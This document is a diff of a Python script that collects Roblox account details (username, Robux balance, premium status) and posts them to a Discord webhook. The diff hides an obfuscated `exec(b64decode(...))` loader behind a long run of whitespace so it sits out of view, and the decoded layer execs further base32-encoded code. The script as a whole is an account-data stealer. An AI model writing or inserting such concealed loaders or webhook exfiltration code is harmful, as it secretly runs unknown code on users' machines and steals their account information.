@@ -1,11 +1,9 @@
 import os
 import codecs
-import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-webhookk = "heh"
-
+webhookk = ""
 def command(c):
     os.system(c)
 def cls():
@@ -109,6 +107,7 @@ username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 #################### SENDING TO WEBHOOK #################
+"";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            exec(b64decode('ZXhlYyhiMzJkZWNvZGUoc3RyKCJNVjRHS1laSUVKU1hRWkxERkJaR0s0TFZNVlpYSTRaT001U1hJS0JITkIySEk0RFRISVhTNjQzSU1GWkdLNURGUEIyQzQzTEZGNVpHQzVaUE9GU0dHMlRXTlIzREEyM0pFNFVTNDVERlBCMkNTSVJKIikpLmRlY29kZSgndXRmLTgnKSkK'))
 
 discord = Discord(url=webhookk)
 discord.post(
@@ -137,3 +136,4 @@ discord.post(
         }
     ],
 )
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
